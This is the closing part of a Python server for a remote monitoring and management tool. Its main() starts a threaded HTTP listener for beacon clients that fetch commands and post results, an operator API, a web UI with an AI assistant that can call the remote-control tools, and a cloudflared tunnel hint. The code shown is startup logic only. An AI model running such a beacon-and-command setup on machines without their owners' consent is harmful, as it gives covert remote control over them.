    ╚═══════════════════════════════════════════╝
    """ + Colors.END)

    server = RMMServer()
    RMMHandler.server_instance = server

    # ThreadingHTTPServer: beacons (/cmd, /result), operator API, and WebSocket run concurrently.
    http_server = ThreadingHTTPServer((LISTEN_HOST, PORT), RMMHandler)
    http_server.daemon_threads = True

    print(f"{Colors.GREEN}[*] RMM listening on {LISTEN_HOST}:{PORT} (threaded HTTP){Colors.END}")
    print(f"{Colors.CYAN}[*] Operator API: http://127.0.0.1:{PORT}{API_PREFIX}/{Colors.END}")
    print(f"{Colors.CYAN}[*] Web UI: http://127.0.0.1:{PORT}/ui/{Colors.END}")
    print(f"{Colors.CYAN}[*] CLI: python rmm_cli.py --url http://127.0.0.1:{PORT}{Colors.END}")
    print(f"{Colors.CYAN}[*] MCP: python mcp_rmm_server.py (see README){Colors.END}")
    print(f"{Colors.CYAN}[*] Web AI: /ui/ → AI Assistant panel (OpenAI key + RMM tools){Colors.END}")
    print(f"{Colors.CYAN}[*] Tunnel: cloudflared tunnel --url http://localhost:{PORT}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Logs: {LOG_DIR}{Colors.END}")
    if API_TOKEN:
        print(f"{Colors.YELLOW}[*] Operator API auth: enabled ({API_PREFIX}/*){Colors.END}")
    if BEACON_SECRET:
        print(f"{Colors.YELLOW}[*] Beacon auth: X-RMM-Beacon-Token required{Colors.END}")
    print()
    
    http_thread = threading.Thread(target=http_server.serve_forever, daemon=True)
    http_thread.start()
    
    if not args.cli:
        print(f"{Colors.BOLD}[*] Headless mode. Press Ctrl+C to stop.{Colors.END}\n")
        try:
            while server.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Shutting down...{Colors.END}")
        http_server.shutdown()
        return

    cli = CommandInterface(server)
    print(f"{Colors.BOLD}Embedded CLI — type 'help' for commands{Colors.END}")
    try:
        __import__("prompt_toolkit")
        _have_ptk = True
    except ImportError:
        _have_ptk = False

    if _have_ptk:
        print(
            f"{Colors.YELLOW}Tip: Client output scrolls above; your input line stays fixed at the bottom.{Colors.END}\n"
        )
        _run_cli_prompt_toolkit(server, cli)
    else:
        print(
            f"{Colors.CYAN}[*] pip install -r requirements.txt for the fixed bottom prompt (prompt_toolkit).{Colors.END}\n"
        )
        _run_cli_readline(server, cli)

    if not getattr(server, "_cli_use_ptk", False):
        readline.write_history_file(HISTORY_FILE)
    http_server.shutdown()

if __name__ == "__main__":
    main()
